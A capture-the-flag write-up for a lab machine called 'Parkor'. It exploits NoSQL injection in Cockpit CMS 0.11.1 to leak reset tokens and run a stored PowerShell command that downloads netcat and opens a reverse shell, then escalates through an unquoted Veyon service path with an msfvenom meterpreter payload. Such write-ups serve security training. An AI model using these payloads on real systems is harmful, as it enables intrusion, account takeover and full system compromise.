## Parkor

### User flag

```bash
$ nmap -sS -sV -Pn -p- -T5 -n 10.129.1.2

Nmap scan report for 10.129.1.2
Host is up (0.022s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 (OpenSSL/1.1.1k PHP/7.4.20)
Service Info: Host: localhost
```

For this challenge, we were given a PHP application on the port 80 with the home page showing a forbidden status.

We started by fuzzing files and directories. By using the wordlist `raft-medium-directories.txt` from SecLists, we noticed the folder `cockpit` was available.

We started another fuzzing round by targeting the sub-directory `cockpit`:
```bash
$ ffuf -D -u http://10.129.1.2/cockpit/FUZZ -w raft-medium-directories.txt -t 20 -fc 403

CONTRIBUTING.md         [Status: 200, Size: 4514, Words: 407, Lines: 68]
Dockerfile              [Status: 200, Size: 738, Words: 130, Lines: 26]
INSTALL                 [Status: 301, Size: 343, Words: 22, Lines: 10]
LICENSE                 [Status: 200, Size: 1133, Words: 153, Lines: 22]
README.md               [Status: 200, Size: 2248, Words: 206, Lines: 71]
addons                  [Status: 301, Size: 342, Words: 22, Lines: 10]
api/2/explore/          [Status: 401, Size: 24, Words: 1, Lines: 1]
api/error_log           [Status: 401, Size: 24, Words: 1, Lines: 1]
api/jsonws              [Status: 401, Size: 24, Words: 1, Lines: 1]
api/2/issue/createmeta  [Status: 401, Size: 24, Words: 1, Lines: 1]
api/jsonws/invoke       [Status: 401, Size: 24, Words: 1, Lines: 1]
api/login.json          [Status: 401, Size: 24, Words: 1, Lines: 1]
api/v2/helpdesk/discover [Status: 401, Size: 24, Words: 1, Lines: 1]
api/package_search/v4/documentation [Status: 401, Size: 24, Words: 1, Lines: 1]
assets                  [Status: 301, Size: 342, Words: 22, Lines: 10]
auth                    [Status: 200, Size: 33, Words: 5, Lines: 1]
api/swagger             [Status: 401, Size: 24, Words: 1, Lines: 1]
api/swagger.yml         [Status: 401, Size: 24, Words: 1, Lines: 1]
api/swagger-ui.html     [Status: 401, Size: 24, Words: 1, Lines: 1]
api/v1                  [Status: 401, Size: 24, Words: 1, Lines: 1]
auth/login              [Status: 200, Size: 5661, Words: 1663, Lines: 153]
api/v2                  [Status: 401, Size: 24, Words: 1, Lines: 1]
api/v3                  [Status: 401, Size: 24, Words: 1, Lines: 1]
composer.json           [Status: 200, Size: 934, Words: 241, Lines: 37]
Dockerfile              [Status: 200, Size: 738, Words: 130, Lines: 26]
install/index.php?upgrade/ [Status: 200, Size: 2051, Words: 706, Lines: 59]
lib                     [Status: 301, Size: 339, Words: 22, Lines: 10]
storage                 [Status: 301, Size: 343, Words: 22, Lines: 10]
:: Progress: [30000/30000] :: Job [1/1] :: 928 req/sec :: Duration: [0:00:32] :: Errors: 2 ::
```

By reading the file `cockpit/composer.json` we noticed the cockpit version `0.11.1` was installed and was vulnerable to NoSQL injections.

After reading the interesting blog post [https://swarm.ptsecurity.com/rce-cockpit-cms/](https://swarm.ptsecurity.com/rce-cockpit-cms/), we started exploiting the NoSQL vulnerabilities:

1. We listed all the registered users by injecting the predicate `$func` that calls the PHP function `var_dump` for each username:

    ```burp
    POST /cockpit/auth/check HTTP/1.1
    Host: 10.129.1.2
    [...]
    
    {"auth":{"user":{
    "$func": "var_dump"
    },"password":"b"},"csfr":"eyJ[...]Jc"}
    
    HTTP/1.0 200 OK
    [...]
    
    string(7) "ricardo"
    string(5) "laura"
    string(6) "steven"
    {"success":false,"error":"User not found"}
    ```

2. We requested a password reset for `steven`:
    
    ```burp
    POST /cockpit/auth/requestreset HTTP/1.1
    Host: 10.129.1.2
    [...]
    
    {"user":"steven"}
    ```

3. We leaked the reset token of the previous password reset request:

    ```burp
    POST /cockpit/auth/resetpassword HTTP/1.1
    Host: 10.129.1.2
    [...]
    
    {"token":{
    "$func":"var_dump"
    }}
    
    
    HTTP/1.0 200 OK
    [...]
    
    string(48) "rp-550435cc8b0dc5e3b23db080c64895d160ff4d28109de"
    [...]]
    ```

4. We changed its password:
    
    ```burp
    POST /cockpit/auth/resetpassword HTTP/1.1
    Host: 10.129.1.2
    [...]
    
    {"token":"rp-550435cc8b0dc5e3b23db080c64895d160ff4d28109de","password":"test1234"}
    
    HTTP/1.0 200 OK
    [...]
    
    {"success":true,"message":"Password updated"}
    ```
   
5. We signed in using the new credentials, and used the administrator privileges of `steven` in order to modify the username of another user in order to store the command to execute:

    ```burp
    
    POST /cockpit/accounts/save HTTP/1.1
    Host: 10.129.1.2
    [...]
    
    {"account":{"user":"powershell curl http://10.10.14.65:8080/nc.exe -o C:/Windows/Temp/nc.exe; C:/Windows/Temp/nc.exe 10.10.14.65 9999 -e powershell.exe","name":"Ricardo","email":"ricardo@mail.htb","active":true,"group":"admin","i18n":"en","_created":1624447093,"_modified":1624626050,"_id":"60d31875353065cc7f000291","_reset_token":null,"api_key":"account-3a99d598a40bd2d6a4b8f3eb541900"}}
    
    HTTP/1.0 200 OK
    [...]
    
    {"user":"powershell curl http:\/\/10.10.14.65:8080\/nc.exe -o C:\/Windows\/Temp\/nc.exe; C:\/Windows\/Temp\/nc.exe 10.10.14.65 9999 -e powershell.exe","name":"Ricardo","email":"ricardo@mail.htb","active":true,"group":"admin","i18n":"en","_created":1624447093,"_modified":1627345520,"_id":"60d31875353065cc7f000291","_reset_token":null,"api_key":"account-3a99d598a40bd2d6a4b8f3eb541900"}
    ```

6. We triggered the execution of the stored commands by using the `$func` filter set to `system` and by exploiting the NoSQLi on the endpoint `/cockpit/auth/check`:

    ```burp
    
    POST /cockpit/auth/check HTTP/1.1
    Host: 10.129.1.2
    [...]
    
    {"auth":{"user":{
    "$func": "system"
    },"password":"b"},"csfr":"e[...]c"}
    
    ```
   
7. We obtained a remote shell on the box as the user `parkor\web` and we retrieved the user flag:

```bash
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.1.2] 49676
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\web\Desktop\xampp\htdocs\cockpit> whoami
whoami

parkor\web

PS C:\Users\web\Desktop\xampp\htdocs\cockpit> type C:\Users\web\Desktop\user.txt
HTB{D0NT_G3T_C00KY_W17H_JUMP1NG_0VER_C0CKPIT}
```

### Root flag

The current user did not have interesting privileges, so we started searching for vulnerable services. 

We noticed the `Veyon` service was running:

```bash
PS> netstat -on 

TCP    127.0.0.1:11100        0.0.0.0:0              LISTENING       4516
TCP    127.0.0.1:11200        0.0.0.0:0              LISTENING       4516
TCP    127.0.0.1:11300        0.0.0.0:0              LISTENING       4516

PS C:\Program Files\Veyon\Veyon Service\Veyon> dir
dir


    Directory: C:\Program Files\Veyon\Veyon Service\Veyon


Mode                LastWriteTime         Length Name                                                                  
[...]                                        
-a----         7/9/2020  12:44 AM         406616 veyon-configurator.exe                                                
-a----         7/9/2020  12:44 AM         957528 veyon-core.dll                                                        
-a----         7/9/2020  12:44 AM         396376 veyon-master.exe                                                      
-a----         7/9/2020  12:44 AM         153688 veyon-server.exe                                                      
-a----         7/9/2020  12:44 AM          24664 veyon-service.exe                                                     
-a----         7/9/2020  12:44 AM          36440 veyon-wcli.exe                                                        
-a----         7/9/2020  12:44 AM          51288 veyon-worker.exe                                                      
-a----         7/9/2020  12:46 AM          31320 vnchooks.dll                                                          
-a----         7/9/2020  12:46 AM         127064 zlib1.dll                                                             
```

After reading the notice [https://www.exploit-db.com/exploits/48246](https://www.exploit-db.com/exploits/48246), we checked the current service path and it was indeed unquoted:

```bash
PS C:\Program Files\Veyon\Veyon Service\Veyon>  wmic service get name,pathname,displayname,startmode
 wmic service get name,pathname,displayname,startmode

DisplayName         Name                PathName                                                            StartMode  
[...]
Veyon Service       VeyonService        C:\Program Files\Veyon\Veyon Service\Veyon\veyon-service.exe        Auto       
[...]
```

In order to exploit the unquoted path vulnerability, we generated a meterpreter payload and stored it at the path `C:\Program Files\Veyon\Veyon.exe` that precedes the unquoted path `C:\Program Files\Veyon\Veyon Service\Veyon\veyon-service.exe`:

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.65 LPORT=8383 -e x64/xor_dynamic -b "\xf6" -f exe > m.exe

PS C:\Program Files\Veyon> powershell curl http://10.10.14.65:8080/m.exe -o Veyon.exe
powershell curl http://10.10.14.65:8080/m.exe -o Veyon.exe

PS C:\Program Files\Veyon> dir
dir

    Directory: C:\Program Files\Veyon

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        6/25/2021   4:02 AM                Veyon Service                                                         
-a----        7/26/2021   5:43 PM           7168 Veyon.exe          
```

Then, we started a metasploit handler:

```bash
$ msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8383
LPORT => 8383
msf6 exploit(multi/handler) > use payload/cmd/unix/interact
msf6 payload(cmd/unix/interact) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8383
LPORT => 8383
msf6 exploit(multi/handler) > set LHOST 10.10.14.65
LHOST => 10.10.14.65
msf6 exploit(multi/handler) > set LHOST 10.10.14.65
LHOST => 10.10.14.65
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

We triggered the vulnerability by restarting the `Veyon` service:

```bash
PS C:\Program Files\Veyon> net stop VeyonService
net stop VeyonService
The Veyon Service service is stopping..
The Veyon Service service was stopped successfully.

PS C:\Program Files\Veyon> net start VeyonService
net start VeyonService
```

Finally, we received a connect-back and we retrieved the root flag:

```bash
[*] Started reverse TCP handler on 10.10.14.65:8383 
[*] Sending stage (200262 bytes) to 10.129.120.163
[*] Meterpreter session 1 opened (10.10.14.65:8383 -> 10.129.120.163:49683) at 2021-07-27 02:46:02 +0200

meterpreter > shell
Process 3296 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:/Users/Administrator/Desktop
cd C:/Users/Administrator/Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
HTB{K33P_V1rTu4L_EY3_ON_PA7H5_S1R}
```
